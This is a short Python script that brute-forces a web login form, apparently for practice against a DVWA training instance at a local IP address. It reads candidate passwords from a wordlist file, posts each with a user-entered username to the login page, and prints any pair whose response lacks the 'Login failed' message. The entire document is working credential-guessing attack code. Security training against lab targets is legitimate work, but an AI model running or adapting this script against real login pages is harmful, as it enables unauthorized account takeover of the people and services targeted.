#!/usr/bin/python
import requests

def bruteforce(username, page_url):
    for password in passwords:
        password = password.strip()
        print("Trying to bruteforce with password " + password)
        data_dictionary = {"username": username, "password": password, "Login":"submit"}
        response = requests.post(page_url, data=data_dictionary)
        if "Login failed".encode('utf-8') in response.content:
            pass
        else:
            print("+ Username --> " + username + " Password " + password)


page_url = "http://192.168.0.20/dvwa/login.php"
username = input(" enter User Name for speecified page : ")

with open("passwordlist.txt", "r") as passwords:
    bruteforce(username, page_url)
